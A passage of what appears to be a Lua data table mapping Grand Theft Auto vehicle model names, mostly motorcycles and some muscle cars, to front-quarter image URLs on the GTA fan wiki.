'https://vignette.wikia.nocookie.net/gtawiki/images/c/c4/Daemon2-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007174857',['Defiler'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/23/Defiler-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007175121',['Deathbike'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/14/ApocalypseDeathbike-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181222102852',['Deathbike2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c6/FutureShockDeathbike-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181222104421',['Deathbike3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/fb/NightmareDeathbike-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181222105830',['Diablous'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b7/Diabolus-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170108144038',['Diablous2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/ae/DiabolusCustom-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170108144119',['Double'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/67/DoubleT-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190313215420',['Enduro'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/2f/Enduro-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190314202047',['Esskey'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/5a/Esskey-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007175341',['Faggio'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/8e/Faggio-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190313223941',['Faggio2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/2e/FaggioSport-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007175817',['Faggio3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/72/FaggioMod-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007175609',['Fcr'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/fd/FCR1000-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170108141019',['Fcr2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/0b/FCR1000Custom-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170108141107',['Gargoyle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/84/Gargoyle-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160712190421',['Hakuchou'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/2e/Hakuchou-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190316210249',['Hakuchou2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/88/HakuchouDrag-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007180008',['Hexer'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b5/Hexer-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190316213514',['Innovation'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/1c/Innovation-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190406212109',['Lectro'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/4/46/Lectro-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20200710094132',['Manchez'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/60/Manchez-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007180149',['Nemesis'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/a7/Nemesis-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180328195005',['Nightblade'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/6a/Nightblade-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007180351',['Oppressor'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/eb/Oppressor-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170625160859',['Oppressor2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/54/Oppressor2-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180730150455',['Pcj'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/30/PCJ600-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180328195901',['Rrocket'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e8/RampantRocket-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190726111817',['Ratbike'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/30/RatBike-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007180822',['Ruffian'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/cd/Ruffian-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180328200533',['Sanchez'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/5f/Sanchez-GTAV-front-Shrewsbury.png/revision/latest/scale-to-width-down/210?cb=20160222221201',['Sanchez2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f0/Sanchez-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180328201207',['Sanctus'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/70/Sanctus-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007181021',['Shotaro'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/16/Shotaro-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007182326',['Sovereign'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/2e/Sovereign-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180328201827',['Stryder'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/36/Stryder-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20200414194021',['Thrust'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/52/Thrust-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180329133140',['Vader'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/ca/Vader-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180329133726',['Vindicator'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/9c/Vindicator-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180329134218',['Vortex'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/72/Vortex-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007183050',['Wolfsbane'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/0b/Wolfsbane-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007183623',['Zombiea'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/df/ZombieBobber-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007184010',['Zombieb'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d2/ZombieChopper-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007183845',['Blade'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/a9/Blade-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180519084714',['Buccaneer'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c9/Buccaneer-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180519085232',['Buccaneer2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/27/BuccaneerCustom-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160928180042',['Chino'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/fe/ChinoSoftTop-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180519085821',['Chino2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/03/ChinoCustom-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161015115820',['Clique'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e4/Clique-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181214164246',['Coquette3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/0f/Coquette3-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180519090558',['Deviant'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/da/Deviant-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181214170039',['Dominator'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/19/Dominator-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170423183314',['Dominator2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/1b/Pi%C3%9FwasserDominator-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160523173623',['Dominator3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/21/DominatorGTX-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180513081146',['Dominator4'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c0/ApocalypseDominator-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190113113445',['Dominator5'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/68/FutureShockDominator-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190115131741',['Dominator6'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e5/NightmareDominator-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190115132549',['Dukes'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/bd/Dukes-GTAV-FrontQuarter.jpg/revision/latest/scale-to-width-down/210?cb=20151108151439',['Dukes2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/a7/DukeO%27Death-GTAV-FrontQuarter.png/r
